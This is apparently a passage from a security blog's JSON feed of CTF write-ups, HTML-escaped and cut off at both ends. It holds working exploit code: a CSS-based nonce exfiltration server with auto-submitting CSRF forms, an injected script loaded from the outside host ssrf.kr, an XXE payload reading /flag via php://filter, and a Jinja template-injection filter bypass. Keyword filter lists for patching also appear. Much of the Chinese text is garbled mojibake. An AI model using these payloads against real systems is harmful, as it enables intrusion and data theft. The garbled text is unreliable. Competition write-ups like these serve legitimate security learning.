&#123;</span></span><br><span class=\"line\"><span class=\"string\">        console.log(&#x27;start&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.emit( &#x27;start&#x27;, &#123;</span></span><br><span class=\"line\"><span class=\"string\">            data: &#x27;start&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    socket.on(&#x27;nonce&#x27;, async function(data) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        if(!isRun) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 1;</span></span><br><span class=\"line\"><span class=\"string\">        if(JSON.parse(data).nonce.length==16)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            await exploit(JSON.parse(data).nonce);</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        else if(nonce &lt;= JSON.parse(data).nonce)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            nonce = JSON.parse(data).nonce</span></span><br><span class=\"line\"><span class=\"string\">            await make_shared_note(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            console.log(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            if(!b) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                b = window.open(&quot;about:blank&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                a = window.open(&quot;http://localhost/share/read&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">                b.location.href = &quot;http://localhost/share/read&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">        &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;);</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    chall_url = &quot;http://localhost/&quot;</span></span><br><span class=\"line\"><span class=\"string\">    start();</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/exploit&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;&quot;&quot;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;nonce&#125;</span> src=//ssrf.kr/ex.js&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/gen_exfil_css&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">css</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> nonce</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(nonce)&lt;=<span class=\"built_in\">len</span>(request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)):</span><br><span class=\"line\">        nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">        app.logger.info(nonce)</span><br><span class=\"line\">        rules = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            rules.append(</span><br><span class=\"line\">                <span class=\"string\">&quot;&quot;&quot;script[nonce^=&quot;&#123;nonce&#125;&#123;c&#125;&quot;] &#123;&#123; background-image: url(&#123;self_url&#125;&#123;ce&#125;) !important&#125;&#125;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(</span><br><span class=\"line\">                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        rules_str = <span class=\"string\">&quot;\\n&quot;</span>.join(rules)</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;&quot;&quot;&lt;style&gt;* &#123;&#123; display: block !important; &#125;&#125;&#123;rules_str&#125;&lt;/style&gt;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(rules_str=rules_str)</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;asdf&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    socketio.run(app, host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">8000</span> ,debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä¹å­\"><a href=\"#ä¹å­\" class=\"headerlink\" title=\"ä¹å­\"></a>ä¹å­</h3><p>å¾ˆå¤šé˜Ÿéƒ½æ˜¯ä½¿ç”¨éšæœºæ•°é¢„æµ‹ç›´æ¥ç ´çš„ã€‚ä¸»åŠæ–¹è¡¨ç¤ºï¼š<br><img src=\"/2023/08/29/CODEGATE2023/lezi.png\" alt=\"notcrypto\" loading=\"lazy\"></p>\n<h2 id=\"0day\"><a href=\"#0day\" class=\"headerlink\" title=\"0day\"></a>0day</h2><p>åˆ©ç”¨è·¯å¾„ç©¿è¶Šå†™maildevçš„lib&#x2F;router.jså¢åŠ è‡ªå®šä¹‰è·¯ç”±ã€‚<br>è°ƒç”¨ï¼šæŠŠæœåŠ¡æ‰“æŒ‚ï¼ˆä¾‹å¦‚è¯•å›¾å†™&#x2F;flagæˆ–è€…&#x2F;etc&#x2F;passwdä»€ä¹ˆçš„ï¼‰ï¼Œé‡å¯çš„æ—¶å€™å°±ä¼šåŠ è½½ã€‚  </p>\n",
            "tags": [
                "Write-Up"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "url": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "title": "CISCN 2023 Write-Up & Tricks",
            "date_published": "2023-07-06T16:28:12.000Z",
            "content_html": "<h1 id=\"CISCN-2023-éƒ¨åˆ†-Write-Up-åŠpatchå¦™å¦™å°æŠ€å·§\"><a href=\"#CISCN-2023-éƒ¨åˆ†-Write-Up-åŠpatchå¦™å¦™å°æŠ€å·§\" class=\"headerlink\" title=\"CISCN 2023 éƒ¨åˆ† Write-Up åŠpatchå¦™å¦™å°æŠ€å·§\"></a>CISCN 2023 éƒ¨åˆ† Write-Up åŠpatchå¦™å¦™å°æŠ€å·§</h1><h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><p>å˜é‡è¦†ç›–+XXEå¤–éƒ¨å®ä½“æ³¨å…¥ä»»æ„æ–‡ä»¶è¯»ã€‚<br>Patchï¼šä¿®äº†extractå°±è¡Œ<br>exp:  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">file = <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">username = <span class=\"string\">&quot;okok20&quot;</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;<span class=\"subst\">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user_xml_format&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class=\"subst\">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">r = requests.get(<span class=\"string\">f&quot;http://175.20.20.196/login.php?username=<span class=\"subst\">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Ciscn-Search-Engine\"><a href=\"#Ciscn-Search-Engine\" class=\"headerlink\" title=\"Ciscn_Search_Engine\"></a>Ciscn_Search_Engine</h3><p>Jinjaæ¨¡æ¿æ³¨å…¥ï¼Œç»•è¿‡æ»¤å­—ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨requestè°ƒç”¨getå‚æ•°æ¥ç»•è¿‡å„ç§å­—ç¬¦ã€‚   </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class=\"line\">post:</span><br><span class=\"line\">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>\n<p>Patchï¼šæŠŠèŠ±æ‹¬å·å¹²äº†ã€‚  </p>\n<h3 id=\"å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\"><a href=\"#å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\" class=\"headerlink\" title=\"å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\"></a>å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“Patchå¤±è´¥çš„åŸå› çš„ï¼Œé‚£ä¹ˆä¸€å®šè¦ç¡®ä¿ä¸è¦Patchè¿‡çŒ›å¯¼è‡´æœåŠ¡å¼‚å¸¸ï¼›æˆ‘ä»¬éœ€è¦<strong>ä¼˜å…ˆç¡®ä¿æœåŠ¡æ­£å¸¸å·¥ä½œï¼Œé€æ­¥åŠ å¤§PatchåŠ›åº¦</strong>ã€‚</p>\n<h4 id=\"è¿‡æ»¤å…³é”®å­—\"><a href=\"#è¿‡æ»¤å…³é”®å­—\" class=\"headerlink\" title=\"è¿‡æ»¤å…³é”®å­—\"></a>è¿‡æ»¤å…³é”®å­—</h4><p>æ— è„‘è¿‡æ»¤å¯ä»¥è¿…é€Ÿæ‰“ä¸ŠPatchï¼æˆ‘ä»¬å¯ä»¥å°½é‡æ„é€ ä¸€äº›æ­£å¸¸æµé‡ä¸­ä¸å¤ªå¯èƒ½å‡ºç°çš„å­—ç¬¦ç»„åˆæ¥é¿å…è¢«åˆ¤æœåŠ¡downæ‰ã€‚<br>æ¯”å¦‚è¯´ï¼Œæƒ³è¦è¿‡æ»¤Pythonæ¨¡æ¿æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿‡æ»¤å¦‚ä¸‹ç»„åˆï¼š<br><code>|_</code>, <code>._</code>, <code>_c</code>, <code>_[</code>, <code>](</code><br>è€Œå¯¹äºSQLæ³¨å…¥å°±æ›´ç®€å•äº†ï¼šè‡ªå·±æ‰“ä¸€æ‰“ï¼Œçœ‹çœ‹å“ªäº›å‡½æ•°ã€ç¬¦å·èƒ½åˆ©ç”¨ï¼Œå°±ç›´æ¥è¿‡æ»¤æ‰ã€‚  </p>\n<h4 id=\"ç±»å‹å®‰å…¨\"><a href=\"#ç±»å‹å®‰å…¨\" class=\"headerlink\" title=\"ç±»å‹å®‰å…¨\"></a>ç±»å‹å®‰å…¨</h4><p>å¦‚æœæ¶‰åŠå¼±ç±»å‹çš„è¯­è¨€ï¼Œæ¯”å¦‚PHPï¼Œç»å¸¸ä¼šæœ‰æ´å‡ºåœ¨å¼±æ¯”è¾ƒä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å¦‚ä¸‹å‡ ç§æ‰‹æ®µï¼š  </p>\n<ul>\n<li>ä½¿ç”¨å¼ºæ¯”è¾ƒï¼šä¾‹å¦‚PHP&#x2F;Jsä¸­ä½¿ç”¨<code>===</code>è€Œé<code>==</code>ï¼›</li>\n<li>åœ¨å…³é”®å‚æ•°å…¥å£å¤„è¿›è¡Œæ­£åˆ™åŒ–ï¼šä¾‹å¦‚ï¼Œå¯¹äºæœŸæœ›æ˜¯æ•´æ•°çš„å‚æ•°<code>iv</code>ï¼Œå°±åº”å¼ºåˆ¶è®©<code>iv=intval(iv)</code>è½¬ä¸ºæ•´å‹ï¼›</li>\n</ul>\n<p>ç›¸ä¿¡ä¹Ÿå¯ä»¥å‘ç°å›½èµ›è¿™ç§patchéš¾åº¦è¿œä½äºattackçš„éš¾åº¦ã€‚å»ºè®®<strong>åšé¢˜çš„åˆæœŸå½“ä½œæ²¡æœ‰æ”»å‡»å¾—åˆ†ï¼Œå…ˆpatchäº†å†è¯´</strong>ã€‚</p>\n",
            "tags": [
                "CISCN",
                "web",
                "Write-Up"
            ]
        },
        {
            "id": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "url": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "title": "ACTF2022 - FFSK - Official WriteUp",
            "date_published": "2022-07-03T15:43:00.000Z",
            "content_html": "<p><del>ä¼—æ‰€å‘¨çŸ¥æ­ªæ­ªæ­ªè‹±æ–‡å¾ˆçƒ‚æ±‚è½»å–·</del>  </p>\n<h2 id=\"0-Intro\"><a href=\"#0-Intro\" class=\"headerlink\" title=\"0. Intro\"></a>0. Intro</h2><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. Iâ€™m happy about their praise, but after checking their solution I think what truly â€œimpressiveâ€ is their creativity and persistence.</p>\n<p><strong>Strongly recommend reading their awesome solution: <a href=\"https://maplebacon.org/2022/06/actf-ffsk/\">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p>\n<p>FSK &#x3D; Frequency-shift keying.</p>\n<p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p>\n<p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>.</p>\n<h2 id=\"1-Description\"><a href=\"#1-Description\" class=\"headerlink\" title=\"1. Description\"></a>1. Description</h2><p>A journey to solve a misc problem always begins from a problem description. Hereâ€™s it:</p>\n<blockquote>\n<p>Iâ€™ve bought the <strong>second commercialÂ modem</strong>Â forÂ computers in a big city of the UK.</p>\n<blockquote>\n<p>æ¿€æƒ…æ¾æ¹ƒçš„çƒè¿·è¿·æ‹è¿™ä¸ªåœ°æ–¹ã€‚é‡ä¸Šçƒèµ›å­£ï¼Œé…’å§é‡Œçš„çƒ­æƒ…ã€å‘å–Šã€å•¤é…’ã€æ‘‡æ»šï¼Œè¶³çƒè®©è¿™ä¸ªåŸå¸‚å……æ»¡æ´»åŠ›å’Œå¸Œæœ›ã€‚<br>ä»ä¸‰ä¸‡è‹±å°ºçš„äº‘ç«¯æœ›å»ï¼Œå¾€æ—¥çš„ç”Ÿæ´»æˆäº†ä¸€ä¸ªé¥è¿œå¾®å°çš„åœ°å›¾ã€‚<br>é˜³å…‰æ˜åªšçš„æ—¥å­ï¼Œå¼€å§‹å‡ºå‘ï¼ŒåŒ—äº¬æ—¶é—´00:50 å¼€å§‹èµ·é£ï¼Œä¸€ä¸ªæ¢¦çš„è·ç¦»ï¼Œå°±å¯ä»¥åˆ°è¾¾è·å…°é˜¿å§†æ–¯ç‰¹ä¸¹ï¼ŒçŸ­æš‚åœç•™ä¹‹åï¼Œç„¶åè½¬æœºé£å¾€è‹±å›½<br>å—èˆªçš„é£æœºé…ç½®å®Œå¤‡ï¼Œå…¨ç¨‹å¯ä»¥å……ç”µï¼Œè¿˜æœ‰wifiï¼Œå½±è§†å±æœ‰é¢å‰æœ€æ–°çš„ç”µå½±ã€‚ç¡ç¡é†’é†’ï¼Œåœ¨é£æœºä¸Šè§…åˆ°ä¸€éƒ¨ã€ŠåŒ—äº¬çˆ±æƒ…æ•…äº‹ã€‹ï¼Œè®©æˆ‘åœ¨ä¸‰ä¸‡è‹±å°ºçš„ç©ºä¸­å“­çš„ç¨€é‡Œå“—å•¦ã€‚</p>\n</blockquote>\n</blockquote>\n<p>Just Google it, and youâ€™ll realize what it means:</p>\n<ul>\n<li><p><strong>second commercialÂ modemâ†’Bell 103, corresponds with the file name â€œmodem.wavâ€</strong></p>\n</li>\n<li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p>\n</li>\n<li><p>The source of the long Chinese paragraph: <a href=\"https://kknews.cc/zh-hk/travel/e6yjp34.html\">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p>\n<p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p>\n</li>\n</ul>\n<h2 id=\"2-Bell-103\"><a href=\"#2-Bell-103\" class=\"headerlink\" title=\"2. Bell 103\"></a>2. Bell 103</h2><p>Hereâ€™s an article that shows how the Bell 103 protocol works: <a href=\"https://vigrey.com/blog/emulating-bell-103-modem\">https://vigrey.com/blog/emulating-bell-103-modem</a></p>\n<p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p>\n<p>You can also find it from the spectrogram of the .wav file.</p>\n<h2 id=\"3-Server-channel\"><a href=\"#3-Server-channel\" class=\"headerlink\" title=\"3. Server channel\"></a>3. Server channel</h2><p>Using the <code>minimodem</code>tool (See MapleBaconâ€™s write-up) is functional.</p>\n<p>Also, you can find some useful tools in GitHub: <a href=\"https://github.com/laurenschneider/audiodecoder\">https://github.com/laurenschneider/audiodecoder</a></p>\n<p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p>\n<p>After all, youâ€™ll see this on the server channel:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class=\"line\">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class=\"line\">effort to correct bit-flips, making sure the communication was less</span><br><span class=\"line\">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class=\"line\">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class=\"line\">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class=\"line\">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-Client-channel\"><a href=\"#4-Client-channel\" class=\"headerlink\" title=\"4. Client channel\"></a>4. Client channel</h2><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. Youâ€™ll get a bit string of 53640 bits.</p>\n<p>Notice that the bit string contains only â€œ01â€ â€œ10â€, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says â€œ01â€â†’1 and â€œ10â€â†’0</p>\n<p>Then the key problem is to solve Hamming code. From the given information, youâ€™ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p>\n<p>Find every â€œ1â€ bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit.</p>\n<p>Actually, every block has, and only has an error bit: thatâ€™s an intended design to notify you that youâ€™re on the right way :)</p>\n<h2 id=\"5-Final-Step\"><a href=\"#5-Final-Step\" class=\"headerlink\" title=\"5. Final Step\"></a>5. Final Step</h2><p>Now youâ€™ve got the cipher bit string: just applied Bell 103 decoder to it once again.</p>\n<p>Itâ€™ll yield a string that starts with <code>data:image/png;base64,</code></p>\n<p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. Itâ€™s a QR Code. Scan it, and got the flag.</p>\n<h2 id=\"6-Hints-Explanation\"><a href=\"#6-Hints-Explanation\" class=\"headerlink\" title=\"6. Hints Explanation\"></a>6. Hints Explanation</h2><ol>\n<li><p><code>æ‰€æœ‰äººéƒ½è®¤ä¸ºï¼Œåƒé¸¡è›‹å‰ï¼ŒåŸå§‹çš„æ–¹æ³•æ˜¯æ‰“ç ´é¸¡è›‹è¾ƒå¤§çš„ä¸€ç«¯ã€‚å¯æ˜¯å½“ä»Šçš‡å¸çš„ç¥–çˆ¶ æ—¶å€™åƒé¸¡è›‹ï¼Œä¸€æ¬¡æŒ‰å¤æ³•æ‰“é¸¡è›‹æ—¶ç¢°å·§å°†ä¸€ä¸ªæ‰‹æŒ‡å¼„ç ´äº†ï¼Œå› æ­¤ä»–çš„çˆ¶äº²ï¼Œå½“æ—¶çš„çš‡å¸ï¼Œ å°±ä¸‹äº†ä¸€é“æ••ä»¤ï¼Œå‘½ä»¤å…¨ä½“è‡£æ°‘åƒé¸¡è›‹æ—¶æ‰“ç ´é¸¡è›‹è¾ƒå°çš„ä¸€ç«¯ï¼Œè¿ä»¤è€…é‡ç½šã€‚ è€ç™¾å§“ä»¬ å¯¹è¿™é¡¹å‘½ä»¤æä¸ºåæ„Ÿã€‚å†å²å‘Šè¯‰æˆ‘ä»¬ï¼Œç”±æ­¤æ›¾å‘ç”Ÿè¿‡å…­æ¬¡å›ä¹±ï¼Œå…¶ä¸­ä¸€ä¸ªçš‡å¸é€äº†å‘½ï¼Œå¦ ä¸€ä¸ªä¸¢äº†ç‹ä½â€¦å…³äºè¿™ä¸€äº‰ç«¯ï¼Œæ›¾å‡ºç‰ˆè¿‡å‡ ç™¾æœ¬å¤§éƒ¨è‘—ä½œï¼Œä¸è¿‡å¤§ç«¯æ´¾çš„ä¹¦ä¸€ç›´æ˜¯å—ç¦çš„ ï¼Œæ³•å¾‹ä¹Ÿè§„å®šè¯¥æ´¾çš„ä»»ä½•äººä¸å¾—åšå®˜ã€‚ â€”â€”ä¹”çº³æ£®Â·æ–¯å¨å¤«ç‰¹ï¼Œã€Šæ ¼åˆ—ä½›æ¸¸è®°ã€‹</code></p>\n<p> It is a quote from Gulliverâ€™s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: â€œbig-endianâ€ &amp; â€œlittle-endianâ€.</strong></p>\n<p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p>\n</li>\n<li><p><code>Hamming code block size: 20bits</code></p>\n<p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p>\n</li>\n<li><p><code>Bell 103</code></p>\n<p> For those who ignored the problem description.</p>\n</li>\n</ol>\n<h2 id=\"6-Script-to-Solve\"><a href=\"#6-Script-to-Solve\" class=\"headerlink\" title=\"6. Script to Solve\"></a>6. Script to Solve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># goertzel.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Module to create a Goertzel filter</span></span><br><span class=\"line\"><span class=\"string\">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span 